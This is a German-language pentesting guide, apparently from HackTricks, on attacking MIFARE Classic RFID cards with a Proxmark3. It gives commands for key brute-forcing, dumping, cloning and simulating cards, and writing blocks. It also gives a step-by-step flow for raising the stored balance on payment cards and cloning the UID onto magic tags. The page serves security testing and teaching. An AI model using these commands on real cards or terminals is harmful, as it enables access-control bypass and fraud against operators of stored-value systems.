# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Angriff auf RFID-Systeme mit Proxmark3

Das Erste, was du brauchst, ist ein [**Proxmark3**](https://proxmark.com) und [**install the software and it's dependencie**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### Attacking MIFARE Classic 1KB

Es hat **16 sectors**, jeder davon hat **4 blocks** und jeder Block enthält **16B**. Die UID ist in sector 0 block 0 (und kann nicht verändert werden).\
Um auf jeden Sektor zuzugreifen benötigst du **2 keys** (**A** und **B**), die in **block 3 of each sector** (sector trailer) gespeichert sind. Der sector trailer speichert auch die **access bits**, die die **read and write**-Berechtigungen auf **each block** mittels der 2 keys vergeben.\
2 keys sind nützlich, um z.B. Leserechte zu geben, wenn man den ersten kennt, und Schreibrechte, wenn man den zweiten kennt (zum Beispiel).

Mehrere attacks können durchgeführt werden
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Der Proxmark3 ermöglicht weitere Aktionen wie **eavesdropping** einer **Tag to Reader communication**, um nach sensiblen Daten zu suchen. Bei dieser Karte könntest du einfach die Kommunikation sniffen und den verwendeten Schlüssel berechnen, weil die **verwendeten kryptographischen Operationen schwach sind** und wenn man Klar- und Chiffretext kennt, kann man ihn berechnen (`mfkey64` Tool).

#### MiFare Classic schneller Ablauf für stored-value abuse

Wenn Terminals Guthaben auf Classic-Karten speichern, ist ein typischer End-to-End-Ablauf:
```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```
Hinweise

- `hf mf autopwn` orchestriert nested/darkside/HardNested-style attacks, stellt keys wieder her und erstellt dumps im client dumps folder.
- Das Schreiben von block 0/UID funktioniert nur auf magic gen1a/gen2 Karten. Normale Classic-Karten haben eine read-only UID.
- Viele Deployments verwenden Classic "value blocks" oder einfache Checksummen. Stelle sicher, dass alle duplizierten/komplementierten Felder und Checksummen nach der Bearbeitung konsistent sind.

Siehe eine Methodik auf höherer Ebene und Gegenmaßnahmen in:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Rohbefehle

IoT-Systeme verwenden manchmal **nonbranded or noncommercial tags**. In diesem Fall kannst du Proxmark3 verwenden, um benutzerdefinierte **raw commands to the tags** zu senden.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
Mit diesen Informationen kannst du versuchen, Informationen über die Karte und darüber zu recherchieren, wie man mit ihr kommuniziert. Proxmark3 erlaubt das Senden von Rohbefehlen wie: `hf 14a raw -p -b 7 26`

### Skripte

Die Proxmark3-Software wird mit einer vorinstallierten Liste von **Automationsskripten** geliefert, die du verwenden kannst, um einfache Aufgaben auszuführen. Um die vollständige Liste abzurufen, verwende den Befehl `script list`. Danach nutze den Befehl `script run`, gefolgt vom Namen des Skripts:
```
proxmark3> script run mfkeys
```
Du kannst ein Skript erstellen, um **fuzz tag readers** zu testen: Kopiere die Daten einer **valid card** und schreibe ein **Lua script**, das ein oder mehrere zufällige **bytes** randomize und überprüft, ob der **reader crashes** bei irgendeiner Iteration.

## Referenzen

- [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [NXP statement on MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [NFC card vulnerability exploitation in KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)

{{#include ../../banners/hacktricks-training.md}}
